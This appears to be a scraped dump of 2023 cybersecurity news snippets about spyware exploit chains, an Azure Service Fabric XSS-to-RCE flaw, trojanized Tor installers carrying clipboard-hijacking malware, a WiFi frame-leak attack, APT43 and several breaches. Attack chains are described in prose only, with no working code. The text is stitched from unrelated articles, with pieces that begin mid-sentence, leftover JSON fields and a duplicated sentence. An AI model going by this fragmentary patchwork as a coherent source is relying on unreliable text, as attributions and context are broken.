Chrome versions prior to 106, and consisted of three zero-day exploits: CVE-2022-3723, CVE-2022-4135, and CVE-2022-38181.The second campaign, reported to TAG by Amnesty International, targeted zero-days and n-days in the latest version of Samsung Internet Browser (CVE-2022-4262; CVE-2023-0266). The exploit chain, Google explained, delivered a fully featured Android spyware suit written in C++ that includes libraries for decrypting and capturing data from various chat and browser applications.Stephen Weigand is managing editor and production manager for SC Media.

These goods are typically circulated through a network of resellers and money mules who help them launder the amounts.The police say it located two call centers in Vinnytsia and Lviv, which supported the fraudulent operation by communicating with the customers to convince them to place orders.The Ukrainian police have conducted over 30 searches on the members' homes, call centers, and cars, confiscating computer equipment, mobile phones, and SIM cards for examination.The Ukrainian police have conducted over 30 searches on the members' homes, call centers, and cars, confiscating computer equipment, mobile phones, and SIM cards for examination.The two arrests made in Ukraine are believed to involve organizers of the criminal gang, so the police detained them for interrogation.The arrested individuals now face criminal charges based on part 4 of Article 190 (fraud) and part 1 of Article 255 (establishment, leadership of a criminal community or criminal organization, as well as participation in it).These crimes incur a maximum penalty of 12 years in prison and confiscation of property.Another ten members of the phishing gang were detained in other European countries, where they are being questioned."

      "text": " Microsoft has patched what researchers called a \"dangerous\" flaw in its Azure Service Fabric component of the company's cloud-hosting infrastructure. If exploited, it would have allowed an unauthenticated, malicious actor to execute code on a container hosted on the platform. With Super FabriXss, a remote unauthenticated attacker can execute code on a container hosted on one of the Service Fabric nodes, which \"means that an attacker could potentially gain control of critical systems and cause significant damage,\" Lidor Ben Shitrit, cloud security researcher at Orca Security, wrote in the post.Using Super FabriXss, an attacker could craft a malicious URL that, when clicked, initiates a multi-step process eventually leading to the creation and deployment of a harmful container on one of the cluster nodes, Shitrit tells Dark Reading.Specifically, researchers demonstrated at BlueHat how they could escalate a reflected XSS vulnerability in Azure Service Fabric Explorer to an unauthenticated RCE by abusing the metrics tab and enabling a specific option in the console: the \"Cluster Type\" toggle, Shitrit wrote in the post.\"To exploit this vulnerability, a victim (an authenticated Service Fabric Explorer user) must first click on the malicious URL and then be guided to click on the Cluster Type under the Events tab,\" he explains to Dark Reading. \"Once exploited, sensitive cluster data could be revealed to the attacker, potentially allowing them to expand the attack to a larger surface.\"The vulnerability itself arises from a vulnerable \"Node Name\" parameter, which can be exploited to embed an iframe in the user's context, Shitrit said in the post. This iframe then retrieves remote files from a server controlled by the attacker, eventually leading to the execution of a malicious PowerShell reverse shell.\"This attack chain can ultimately result in remote code execution on the container [that] is deployed to the cluster, potentially allowing an attacker to take control of critical systems,\" he wrote.Orca reported the vulnerability to the Microsoft Security Response Center (MSRC) on Dec. 20, and an investigation into the issue begun later that month, on Dec. 31, the researchers said. Orca researchers and MSRC communicated several times regarding the impact of the flaw before Microsoft assigned CVE-2023-23383 to the vulnerability and issued a patch for it on March 14 that automatically fixed the issue for customers.\"With cloud-based systems, organizations often depend on third-party providers, leading to a larger attack surface and less control over security measures,\" he adds. \"Additionally, it's important to consider the multi-tenant nature of cloud environments and the significance of maintaining proper isolation between tenants.\"To address risks posed by cloud-based flaws like Super FabriXss, he suggests that organizations maintain a regime of cloud security hygiene. This includes regularly applying patches, monitoring security, addressing vulnerabilities, training employees on best practices, applying network segmentation, enforcing least-privilege permissions, collaborating with providers, and creating a robust incident response plan, Shitrit says.\"These combined efforts help ensure a secure and resilient cloud environment,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Fortinet captured three malware variants, indicating that it is being actively developed.The first variant establishes communication with the C2 and awaits the reception of one of the following commands:The second variant of ShellBot, which first appeared in March 2023 and already counts hundreds of victims, features a much more extensive set of commands, as shown below:Interestingly, the malware features an exploit enhancement module that aggregates news and public advisories from PacketStorm and milw0rm.The recommended action to defend against Mootbot and ShellBot is to use strong administrator passwords and apply the security updates that fix the mentioned vulnerabilities.If your device is no longer supported by its vendor, it should be replaced with a newer model to receive security updates."

Submissions will also need to include a software bill of materials, which must contain all commercial, open-source, and off-the-shelf software components, while complying with other FDA requirements “to demonstrate reasonable assurance that the device and related systems are cybersecure.”These plans should come as no surprise to device manufacturers, as they were included in the new authorities granted by the Consolidated Appropriations Act of 2023, which was signed into law on Dec. 29.The December Omnibus included statements that required the FDA to take the actions announced March 29 within 90 days of the law’s passage.

      "text": " The U.S. government is sending $25 million to the government of Costa Rica to help the country recover from a devastating ransomware attack last year that crippled several key agencies.On Wednesday, a senior White House official said that using funding from the State Department, the U.S. government would be committing $25 million to Costa Rica’s cybersecurity efforts after a direct request from Chaves. The funding will be used to secure the country’s networks and defend its critical infrastructure.“Last spring, Costa Rica experienced some of the worst ransomware attacks than any country had experienced, which really impacted the country's critical services. It disrupted their finance, telecommunications and social security institutions and resulted in President Chavez declaring a state of emergency,” the official told reporters Wednesday. “At the time, we immediately deployed a team of U.S. experts to assist in Costa Rica’s recovery and have been working closely with the country since then, and have recognized that further assistance is needed.”The funding will go toward creating a centralized security operations center within the Ministry of Science, Innovation, Technology and Communications that will work to prevent, detect and respond to cyberattacks.The center will also coordinate cybersecurity efforts across all of Costa Rica’s departments and agencies. Portions of the funding will support strategic and technical planning, cybersecurity training and capacity building as well as hardware, software, licenses and tools.Biden administration officials plan to meet with Chavez in the coming weeks to discuss the grant and broader measures to secure digital infrastructure.“President Chavez and the government believe that their strong support for Ukraine and the strong statements may have been a factor in the significant ransomware attacks,” the official said. “We recognize that supporting our allies’ and partners’ security is important in the context of the work we're doing to support our European allies and partners against Russian cyberattacks.”\nCosta Rican president Rodrigo ChavesThe $25 million would also “make such a significant difference in terms of the security operation center, helping them get facts on the ground, helping them build up the capacity to then manage it from this point on their own,” the official added.The official noted that both Albania and Costa Rica were first helped by a team of ransomware experts within the FBI – which they called the “U.S.’ core expert incident response team.”The White House official called the initiative a “cornerstone” of the Biden administration’s cybersecurity agenda and a pathway for more cyber-mature countries to “lift up so many allies and partners.”They noted that the cybersecurity efforts were key to U.S. support for democracies that now need better tools to hold secure elections, calling their work “foundational to democracy” and important in upholding “responsible cyber norms that hold malicious actors accountable.”“We thought that we could be helpful and we intentionally added a co-lead to the diplomacy panel – which is now led by Nigeria and Germany – because we want to bring in that Global South,” the official said.“So there's been outreach since October 2022 to the countries we felt could really benefit from membership. And that has resulted in the Costa Rican application.”The National Security Council, White House and State Department did not respond to requests for comment about what other countries have applied to join the initiative. The official explained that once a country applies to join, other countries can object. If there are no objections, the country is inaugurated into the initiative.When asked whether other countries were contributing funding, the official would specify but explained that several NATO members and countries across Asia were contributing money as well as expertise to broad cybersecurity efforts.“There are countries there that truly are very much in need of help. So our goal there was to say, money is one thing, expertise is very much needed as well, and to have a set of NATO countries who can commit specific capabilities,” they said, adding that more of the initiatives will be revealed at a summit in the Lithuanian capital of Vilnius this summer.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

In a later statement, 3CX confirmed that the 18.11.1213, 18.12.402, 18.12.407 & 18.12.416 versions of the Mac client were infected.BleepingComputer confirmed this same certificate was used in older versions of 3CX software.SentinelOne detects \"penetration framework or shellcode\" while analyzing the 3CXDesktopApp.exe binary, ESET tags it as a \"Win64/Agent.CFM\" trojan, Sophos as \"Troj/Loader-AF\", and CrowdStrike's Falcon OverWatch managed threat hunting service warns users to investigate their systems for malicious activity \"urgently.\"A 3CX spokesperson didn't reply to a request for comment when BleepingComputer reached out earlier today.\"We are going to analyze and issue a full report later on today. Right now we are just focusing on the update.\"In a blog post about the incident, 3CX CISO Pierre Jourdan states that its desktop apps were compromised due to an upstream library.\"The issue appears to be one of the bundled libraries that we compiled into the Windows Electron App via GIT,\" explains Jourdan in the blog post.\"We’re still researching the matter to be able to provide a more in depth response later today. Here’s some information on what we’ve done so far.\"However, 3CX has yet to share what library they are referring to and whether it led to their developer environment becoming compromised.BleepingComputer has reached out to 3CX with further questions about the incident."

      "text": " Threat actors are using Trojanized installers for The Onion Router (Tor) browser to distribute clipboard-injector malware that pilfers funds from cryptocurrency accounts and transfers it to their illicit wallets.\"Given that we only see a fraction of the real picture, the global number of infections may well be several or even tens of times higher,\" Kaspersky warned in a report this week.Clipboard injector malware, aka a clipboard hijacker, intercepts and replaces the contents of a user's clipboard with malicious code or content. This type of malware is not new, it has been around for at least a decade. Over the past few years, cybercriminals have typically used the malware to replace cryptocurrency wallet information from a user's clipboard with their own crypto information — and then transferring coins from the victim's wallet to their own.Though seemingly straightforward, clipboard injector tools can be hard to detect and handle, Kaspersky said. They don't exhibit any of the more obvious behaviors associated with typical malware such as communicating with an external system, causing pop ups, or slowing down an infected system. They often blend in with legitimate clipboard activity and any data that the malware replaces can be hard to detect because of how frequently data in a clipboard gets overwritten in the normal course of events.\"[Clipboard injectors] can be silent for years, show no network activity, or any other signs of presence until the disastrous day when they replace a crypto wallet address,\" Kaspersky said.Threat actors so far have typically used phishing emails, malicious websites, and other malware to distribute clipboard hijackers.The campaign to distribute it via weaponized Tor installers is a spin that Kaspersky surmised was likely inspired by Russia's move to ban access to the browser.Tor gives individuals a way to browse the Internet anonymously by routing their traffic through a network of volunteer-run servers around the world. Frequent Tor users — apart from cybercriminals — include human rights activities, journalists, and those seeking to circumvent censorship and surveillance. Tor has previously described Russia as a country with over 300,000 daily Tor users.According to Kaspersky, threat actors began distributing Trojanized Tor bundles to Russian-speaking users in December 2021, soon after the country's move to block access. The bundles typically consist of the original torbrowser dot exe installer with a valid Tor Project digital signature, a command-line extraction tool in the RAR archive form with a randomized name, and a password-protected RAR archive.When a user downloads the weaponized Tor browser bundle, the original torbrowser executable runs in the foreground. In the background, it also runs the extraction tool on the password-protected RAR archive, which sets into motion a set of actions that ends with the clipboard injector malware installed on the victim system.The authors of the malware likely have used a cracked version of Enigma, a commercially available software protector, to pack the malware and make it harder to detect.Once installed, the \"malware integrates into the chain of Windows clipboard viewers and receives a notification every time the clipboard data is changed,\" Kaspersky said.If the malware detects cryptocurrency information in the clipboard, it replaces the content with an attacker-controlled address for Bitcoin or another cryptocurrency. Kaspersky researchers who analyzed various samples of the malware found each sample to contain thousands of replacement addresses making it hard for defenders to create a deny list or to trace cryptocurrency theft, the security vendor said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

I want to assure you that the other LP pools on the DEX have not been affected, and nor have any of our upcoming upgrades and releases.\"Karony previously stated that this system would only be used for emergencies, like when the liquidity pool would face risks with malicious smart contracts, excessive slippage, and other transient losses.The hacker utilized the function to burn large amounts of SafeMoon tokens, causing the price of the token to shoot up in price.As soon as the price increased, another address sold SafeMoon at the manipulated price, draining $8.9 million from the SafeMoon:WBNB liquidity pool.A few hours after the attack, the actor who converted the SafeMoon to BNB claimed they were not the initial hacker but \"accidentally performed a front run\" after the price was artificially inflated due to the exploit of the burn() function.\"Hey relax, we are accidently frontrun an attack against you, we would like to return the fund, setup secure communication channel , lets talk,\" said a comment added to the transaction.Since then, the person has transferred 4,000 Binance Coins (BNB), worth $1,264,440.00, to another address, making the frontrun look less accidental."

Washington County has more than 25,000 residents and is about 45 minutes away from Panama City, Florida.A spokesperson for the sheriff’s office confirmed that they were hit with ransomware and said it “recovered” from the incident about two weeks ago.“We believe the attack originated in Russia. We aren’t absolutely sure but we believe it to be,” Sheriff Kevin Crews said. “We are grateful our communication lines never went down. We never lost our phone lines and were able to continue to serve our community in that arena.”The department’s app was offline from February 21 until early March due to the attack, which took down their finance system and jail networks. They hired a private IT company to help with the recovery effort.\nA post on LockBit's extortion siteThe LockBit ransomware group took credit for the attack on February 27 and threatened to leak the data by March 20. The group removed the sheriff’s office briefly before reposting it on Tuesday, leaking all of the data the group stole.The sheriff’s office would only say that it spent less than $20,000 on IT and database recovery services.LockBit was tied to 129 ransomware attacks in February – a 150% spike in the group’s activity compared to January.“Looking at the most prevalent threat actors, Lockbit 3.0 looks set to carry on where it left off in 2022, and is already leading the way as 2023’s most prevalent threat actor by some margin,” said Matt Hull, global head of threat intelligence at NCC Group.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Google's findings this week show that those efforts have done little to thwart the commercial-spyware scene, and \"underscore the extent to which commercial surveillance vendors have proliferated capabilities historically only used by governments with the technical expertise to develop and operationalize exploits,\" TAG researchers wrote in the post.Specifically, the researchers discovered what they characterize as two \"distinct, limited, and highly targeted\" campaigns aimed at users of Android, iOS, and Chrome on mobile devices. Both use zero-day exploits and n-day exploits. Regarding the latter, the campaigns take particular advantage of the period of time between when vendors release fixes for vulnerabilities and when the hardware manufacturers actually update end-user devices with those patches, creating exploits for unpatched platforms, the researchers said.This demonstrates that those creating the exploits are keeping a close eye on vulnerabilities that they can exploit for nefarious purposes and are likely colluding to maximize the potential for using them to compromise targeted devices, according to TAG. The campaigns also suggest that surveillance software vendors share exploits and techniques to enable the proliferation of dangerous hacking tools, the researchers wrote in the post.The first campaign that researchers outlined was discovered in November and exploits two vulnerabilities in iOS and three in Android, including at least one zero-day flaw each.The final payload of the iOS campaign was a simple stager that pings back the GPS location of the device and also allows the attacker to install an .IPA file (iOS application archive) onto the affected handset, researchers said. This file can be used to steal information.Google TAG researchers discovered the second campaign, which includes a complete exploit chain using both zero-days and n-days to target the latest version of Samsung Internet Browser, in December. The browser runs on Chromium 102 and has not been updated to include recent mitigations, which would have required attackers to do additional work to carry out the exploit, the researchers said.The payload of the exploit in this case was a C++-based, \"fully-featured Android spyware suite\" that included libraries for decrypting and capturing data from various chat and browser applications, the researchers wrote. They suspect that the actor involved may be a customer, partner, or otherwise close affiliate of Variston.\"The exploit chain also took advantage of multiple kernel information leak zero-days when exploiting CVE-2022-22706 and CVE-2023-0266\" that Google reported to ARM and Samsung, the researchers wrote.TAG researchers provided a list of indicators of compromise (IoC) to help device users know if they're being targeted by the campaigns. They also stressed how important it is for vendors as well as users to update their mobile devices with the latest patches as quickly as possible after vulnerabilities and/or exploits for them are discovered.\"A big takeaway here would be to use fully updated software on fully updated devices,\" Google TAG researchers say in response to questions posed by Dark Reading. \"In this case, none of the exploit chains described would have worked.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  A New York-based medical malpractice law firm has agreed to pay $200,000 to the New York Attorney General over inadequate data security practices that led to the now-infamous Microsoft Exchange attacks in 2021.  In November 2021, months after Microsoft issued patches for vulnerabilities in its servers, the attackers gained access to unpatched systems for legal firm Heidell, Pittoni, Murphy & Bach (HPMB) and compromised the private data of nearly 115,000 hospital patients, including names, dates of birth, social security numbers, and health information.  In addition to the financial penalty, HPMB has agreed to improve its security measures — including establishing an appropriate patch management program, conducting annual risk analysis, encrypting private and health information, and securely deleting ePHI and private information when appropriate— to protect its clients' patients' data in the future.  \"Confidential patient information should be treated with care and secured online to protect New Yorkers from identity theft and fraud. The institutions charged with protecting this information have a responsibility to get it right, and to keep authorities and New Yorkers informed about breaches,\" James added.  SC Media has reached out to the law firm for comment.  On or around Christmas, the attacker deployed Lockbit ransomware on HPMB's network. While the company hired a forensic firm to negotiate, the attackers provided a list of tens of thousands of files that they claimed to have stolen from the HPMB’s systems, including legal pleadings, patient lists, and medical records, which the forensic firm later confirmed were indeed exfiltrated from the law firm, the investigation found.  On May 16, 2022, HPMB's vendor concluded the information of 114,979 hospital patients, including 61,438 New York residents, has likely been exposed. The law firm started notifying affected parties while reporting the incident to the U.S. Department of Health and Human Services on the same day. Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

Additionally, the malware uses a uTorrent icon to hide on the breached system.Kaspersky has detected 16,000 variants of these Tor installers between August 2022 and February 2023 in 52 countries, based on data from users of its security products.While the majority are targeting Russia and Eastern Europe, they have also been seen targeting the United States, Germany, China, France, the Netherlands, and the UK.As cryptocurrency addresses are long and complicated to type, it is common to copy them first to the clipboard and then paste them into another program or website.The malware monitors the clipboard for recognizable crypto wallet addresses using regular expressions, and when one is detected, replaces it with an associated cryptocurrency address owned by the threat actors.When the user pastes the cryptocurrency address, the threat actor's address will be pasted instead, allowing the attackers to steal the sent transaction.Kaspersky says the threat actor uses thousands of addresses on each malware sample, selected randomly from a hardcoded list. This makes wallet tracking, reporting, and banning hard.The cybersecurity company unpacked hundreds of malware samples it had collected to extract the replacement addresses and found that they stole almost $400,000, excluding Monero, which cannot be traced.This is the money stolen only from a single campaign operated by a specific malware author, and there are almost certainly other campaigns using trojanized installers for different software.A simple test to check if a clipper has infected you is to copy and paste this address to your Notepad: bc1heymalwarehowaboutyoureplacethisaddress.If it is changed, it means your system is compromised."

      "text": " Cybersecurity researchers have discovered a fundamental security flaw in the design of the IEEE 802.11 WiFi protocol standard, allowing attackers to trick access points into leaking network frames in plaintext form.WiFi frames are data containers consisting of a header, data payload, and trailer, which include information such as the source and destination MAC address, control, and management data.These frames are ordered in queues and transmitted in a controlled matter to avoid collisions and to maximize data exchange performance by monitoring the busy/idle states of the receiving points.The researchers found that queued/buffered frames are not adequately protected from adversaries, who can manipulate data transmission, client spoofing, frame redirection, and capturing.\"Our attacks have a widespread impact as they affect various devices and operating systems (Linux, FreeBSD, iOS, and Android) and because they can be used to hijack TCP connections or intercept client and web traffic,\" reads the technical paper published yesterday by Domien Schepers and Aanjhan Ranganathan of Northeastern University, and Mathy Vanhoef of imec-DistriNet, KU Leuven.The IEEE 802.11 standard includes power-save mechanisms that allow WiFi devices to conserve power by buffering or queuing frames destined for sleeping devices.When a client station (receiving device) enters sleep mode, it sends a frame to the access point with a header that contains the power-saving bit, so all frames destined for it are queued.The standard, however, does not provide explicit guidance on managing the security of these queued frames and does not set limitations like how long the frames can stay in this state.Once the client station wakes up, the access point dequeues the buffered frames, applies encryption, and transmits them to the destination.An attacker can spoof the MAC address of a device on the network and send power-saving frames to access points, forcing them to start queuing frames destined for the target. Then, the attacker transmits a wake-up frame to retrieve the frame stack.The transmitted frames are usually encrypted using the group-addressed encryption key, shared among all the devices in the WiFi network, or a pairwise encryption key, which is unique to each device and used to encrypt frames exchanged between two devices.However, the attacker can change the security context of the frames by sending authentication and association frames to the access point, thus forcing it to transmit the frames in plaintext form or encrypt them with an attacker-provided key.The researchers report that network device models from Lancom, Aruba, Cisco, Asus, and D-Link are known to be affected by these attacks, with the complete list below.The researchers warn that these attacks could be used to inject malicious content, such as JavaScript, into TCP packets.\"An adversary can use their own Internet-connected server to inject data into this TCP connection by injecting off-path TCP packets with a spoofed sender IP address,\" warn the researchers.\"This can, for instance, be abused to send malicious JavaScript code to the victim in plaintext HTTP connections with as goal to exploit vulnerabilities in the client's browser.\"While this attack could also be used to snoop on traffic, as most web traffic is encrypted using TLS, there would be a limited impact.The first vendor to acknowledge the impact of the WiFi protocol flaw is Cisco, admitting that the attacks outlined in the paper may be successful against Cisco Wireless Access Point products and Cisco Meraki products with wireless capabilities.However, Cisco believes says that the retrieved frames are unlikely to jeopardize the overall security of a properly secured network.Still, the firm recommends applying mitigation measures like using policy enforcement mechanisms through a system like Cisco Identity Services Engine (ISE), which can restrict network access by implementing Cisco TrustSec or Software Defined Access (SDA) technologies.Currently, there are no known cases of malicious use of the flaw discovered by the researchers."

      "text": " Cybercriminal group Kimsuky has evolved into a full-fledged, persistent threat, carrying out \"unusually aggressive\" social-engineering attacks aimed at gathering intelligence, and stealing and laundering cryptocurrency to support the North Korean government.Now, however, Mandiant researchers have found that APT43 is evolving in several ways.For one, the group is now following in the shoes of other North Korean APTs and branching out beyond mere cyber espionage to steal cryptocurrency, the researchers have found. In addition to using the ill-gotten currency to fund the regime of Kim Jong-un, as other groups do, APT43 also uses it to bolster its own activities, they said.The group is even going the extra step of laundering the crypto through legitimate cloud-mining services so it comes out as clean currency and is difficult to track — an activity that might be used by other groups, but has flown under the radar until now, the researchers said.\"The washing of funds and the 'how' has been the missing piece of the equation,\" notes Michael Barnhart, Mandiant principal analyst at Google Cloud. \"We have indications that APT43 utilizes specific hash rental services to launder these funds by mining for different cryptocurrencies.\"For a small fee, these services provide hash power, which APT43 uses to mine cryptocurrency to a wallet selected by the buyer without any blockchain-based association to the buyer's original payments. This allows the APT to use stolen funds to mine for a different cryptocurrency, the researchers said. By spending very little, threat actors walk away with untracked, clean currency to do as they wish, Barnhart explains.Moreover, APT43 — while technologically unsophisticated — relies on advanced and persistent social-engineering tactics in which threat actors create convincing fake personas and exhibit patience in building relationships with targets over several weeks without using malware, the researchers said.\"I've never seen an APT quite as successful with such novel techniques,\" Barnhart notes. \"They pretend to be subject-matter experts or reporters and ask targeted questions — often with the promise of quoting the victim in a report or news article — and successfully gain feedback.\"Indeed, in some instances, attackers successfully convinced targeted victims to send over proprietary, geopolitical analysis and research without deploying malware at all, the researchers said.This deviates from standard procedure for most threat groups, allowing APT43 to expend little effort or resources in building malware and gaining the information they are seeking in a low-fi way — by merely asking victims for it, Barnhart notes.APT43 has shifted its targets, and the malware it uses, in campaigns over the years in response to the demands of the North Korean government and the cyberespionage activities it requires of the group, according to Mandiant.\"APT43 ultimately modifies its targeting and tactics, techniques, and procedures (TTPs) to suit its sponsors, including carrying out financially-motivated cybercrime as needed to support the regime,\" the researchers said in the report.For example, prior to October 2020, the group primarily targeted US and South Korean government offices, diplomatic organizations, and think tank-related entities with a stake in foreign policy and security issues affecting the Korean peninsula. Over the next year, however, the group shifted its focus to COVID-19 response efforts in North Korea by targeting health-related verticals and pharmaceutical companies in South Korea, the US, Europe, and Japan.One notable difference that has emerged between the group and other North Korean threat actors is a recent shift to expand, targeting \"everyday users\" based on \"the sheer velocity and volume of attacks,\" says Joe Dobson, Mandiant principal analyst.\"By spreading their attack out across hundreds, if not thousands, of victims, their activity becomes less noticeable and harder to track than hitting one large target,\" he says. \"Their pace of execution, combined with their success rate, is alarming.\"APT43 is aiming its high-volume activity at entities and organizations in government, business services, and manufacturing as well as think tanks and organizations in education and research related to geopolitical and nuclear policy in the US, South Korea, and Japan, the researchers said.Given its advanced social-engineering tactics and tendency to go after both specific individuals and wider-net targets, researchers advised organizations that may be at risk to share with their employees \"a greater understanding of cyber hygiene and heightened awareness,\" Barnhart says. \"It's important to make personnel aware of this threat actor's TTPs,\" Barnhart says.He adds that the APT's spoofed emails are highly convincing, which makes them difficult to spot, even for savvy users; thus, organizations at risk should be on high alert.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

We can confirm no customer data has been compromised, and our business operations have not been impacted.\"The gambling and entertainment company says they will continue to work with law enforcement to continue the investigation of the security incident and will provide updates if new evidence surfaces.Clop is still extorting the victims by threatening to release the data it stole from their networks but has not yet leaked anything on its data leak site.Although Fortra offered the plaintiff, a Hatch Bank customer, one year of free identity monitoring and fraud protection services, the gesture is dismissed as insufficient to mitigate the lifetime risk of personal data exposure.The Clop ransomware gang has a history of exploiting zero-day flaws to steal data from companies and perform massive extortion waves."

      "text": " Freelance JournalistDiscussing the findings in an advisory published today, the company said the attacks were first observed in September 2022 and relied on malware replacing part of the clipboard contents with cryptocurrency wallet addresses.Kaspersky added that this is particularly true when considering that while worms and viruses may not necessarily connect to the attacker’s control servers, they often generate visible network activity or increase CPU or RAM usage.“So does encrypting ransomware. Clipboard injectors, on the contrary, can be silent for years, show no network activity or any other signs of presence until the disastrous day when they replace a crypto wallet address,” the company explained.Kaspersky added that the malware campaign relying on this technique was observed abusing Tor Browser installers.“We relate this to the ban of Tor Project’s website in Russia at the end of 2021, which was reported by the Tor Project itself [...] Malware authors heard the call and responded by creating trojanized Tor Browser bundles and distributing them among Russian-speaking users.”As for the payload observed during the malicious campaign, Kaspersky explained it was a passive and communication-less clipboard-injector malware.“The malware integrates into the chain of Windows clipboard viewers and receives a notification every time the clipboard data is changed,” reads the advisory. “If the clipboard contains text, it scans the contents with a set of embedded regular expressions. Should it find a match, it is replaced with one randomly chosen address from a hardcoded list.”The clipboard-injector mainly targeted systems in Russia and Eastern Europe, but also in the US, Germany and China, among others.To mitigate the impact of this threat, Kaspersky advised system defenders to download software from only reliable and trusted sources.“A mistake likely made by all victims of this malware was to download and run Tor Browser from a third-party resource,” the company explained. “The installers coming from the official Tor Project were digitally signed and didn’t contain any signs of such malware.”"

      "text": " The leaked code was contained in four folders. Though inaccessible as of March 24, some of the folder names — like \"auth\" and \"aws-dal-reg-svc\" — seem to give some hint at what they contained within.According to Ars Technica, FreeSpeechEnthusiast joined Github on Jan. 3 and committed all the leaked code that same day. That means, in all, the code was entirely accessible to the public for nearly three months.Major software companies are built on millions of lines of code and every so often, for one reason or another, some of it can leak.Hackers aren't always a part of the story, though. In Twitter's case, circumstantial evidence points to a dissatisfied employee. And \"a good deal of it also comes from code ending up where it does not belong unintentionally, as we saw with Toyota, where a subcontractor made a copy of a private codebase public,\" he adds. \"The complexity of working with git and CI/CD combined with an ever-growing number of repos to deal with for modern applications means code on private repos can become public by mistake.\"For Twitter and companies like it, source code leaks can be a much bigger problem for cybersecurity than copyright infringement. Once a private repository becomes public, all kinds of harm can follow.\"It's important to remember that source repositories often contain more than just the code,\" notes Tim Mackey, principal security strategist for the Synopsys Cybersecurity Research Center. \"You'll find test cases, potentially sample data along with details on how the software should be configured.\"There may also be sensitive personal information and authentication information hidden in the code. For example, \"for some applications that are never intended to be shipped to customers, the default configuration contained in the source code repository might just be the running configuration,\" Mackey says. Hackers can use stolen authentication and configuration data to carry out bigger and better attacks against the victim of a leak.That's why \"companies should adopt a more secure secrets management strategy, combining secrets storage with secrets detection,\" says GitGuardian's McDaniel. \"Organizations should also audit their current secret[s] leakage situation to know what systems are at risk if a code leak does occur and where to focus prioritization.\"But in cases where the leak comes from the inside — like Twitter's — even greater caution is warranted. It requires thorough threat modeling and analysis of an enterprise's source code management, says Mackey.\"This is important because if someone can trigger a source code leak, then they may also have the ability to change the source code,\" he says. \"If you're not using multifactor authentication for access, enforcing limited access to only approved users, enforcing access rights, and access monitoring, then you may not have a full picture of how someone might exploit the assumptions your development teams have made when they secured their source code repository.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Weeks later, details are still emerging about the sprawling attack.For its part, Forta has remained publicly quiet about the steady stream of disclosures. But today, it gave Dark Reading a statement with reassurances that it's committed to helping its customers navigate what is evolving into a communications, as well as a cybersecurity, crisis for the company.\"On January 30, 2023, we were made aware of suspicious activity within certain instances of our GoAnywhere MFTaaS solution,\" Fortra says in a statement issued to Dark Reading. \"We immediately took multiple steps to address this, including implementing a temporary outage of this service to prevent any further unauthorized activity, and sharing mitigation guidance, which includes instructions to our on-prem customers about applying a developed patch.\"Fortra added that it remains committed to supporting its affected users.\"We are working diligently to notify customers who may have been impacted and we coordinated with CISA to add information about this vulnerability to their CVE catalog to broaden the reach of information about this issue,\" Fortra's spokesperson's statement adds. \"We are taking this very seriously and continue to help our customers implement mitigation steps to address this issue.\"\"This one wasn't communicated well, challenging even the best security teams to respond,\" Heath Renfrow, co-founder of Fenix24 tells Dark Reading in response to the freshly issued statement from Fortra. \"This is a good example of how it is necessary for security professionals to have multiple sources of threat intelligence — beyond just their providers — to cover every base. That said, it has been communicated now and anyone using the solution should patch immediately.\"Slow communication can be especially detrimental in a software supply chain attack scenario, Dirk Schrader, vice president of security research at Netwrix said.\"To prevent further evolvement of a supply chain attack, it is crucial for the first victim in line to communicate openly and in detail about what happened,\" he noted via email. \"It helps other links in this chain to be prepared for an upcoming threat and minimizes possible damage. It is likely that the current attack was accelerated due to details about this zero-day not being disclosed in a timely manner.\"Dark Reading asked Fortra for a response to the criticism of its handling of the cybersecurity incident but has not received a response. Meanwhile, Forta's customer, the City of Toronto, when asked about its communications with Fortra regarding the breach, gave a simple response by email: \"Fortra has been communicating with the City and continues to do so.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Microsoft is introducing a new Exchange Online security feature that will automatically start throttling and eventually block all emails sent from \"persistently vulnerable Exchange servers\" 90 days after the admins are pinged to secure them. As Redmond explains, these are Exchange servers in on-premises or hybrid environments that run end-of-life software or haven't been patched against known security bugs.\"Any Exchange server that has reached end of life (e.g., Exchange 2007, Exchange 2010, and soon, Exchange 2013), or remains unpatched for known vulnerabilities,\" The Exchange Team explained.\"For example, Exchange 2016 and Exchange 2019 servers that are significantly behind on security updates are considered persistently vulnerable.\"Microsoft says this new Exchange Online \"transport-based enforcement system\" has three distinct functions: reporting, throttling, and blocking.The new system's primary goal is to help Exchange admins identify unpatched or unsupported on-prem Exchange servers, allowing them to upgrade or patch them before they become security risks.However, it will also be able to throttle and eventually block emails from Exchange servers that haven't been remediated before reaching Exchange Online mailboxes.This new enforcement system will only affect servers running Exchange Server 2007 using OnPremises connectors to send mail, to allow for fine-tuning before expanding to all Exchange versions (regardless of how they connect to Exchange Online).Redmond says it follows a progressive approach designed to gradually increase throttling and introduce email blocking until all emails sent from vulnerable servers are rejected.These enforcement actions are designed to slowly escalate until the vulnerable Exchange servers are remediated by removal from service (for end-of-life versions) or patched (in the case of releases still under support).\"The enforcement system is designed to alert admins about security risks in their environment, and to protect Exchange Online recipients from potentially malicious messages sent from persistently vulnerable Exchange servers.\"For some admins, ensuring that emails sent from vulnerable servers in their environment to Exchange Online mailboxes will not get automatically blocked will likely be another \"incentive\" that will add to their ongoing effort to keep end-users protected against potential attacks."

      "title": "Drive to Pervasive Encryption Boosts Key Management",
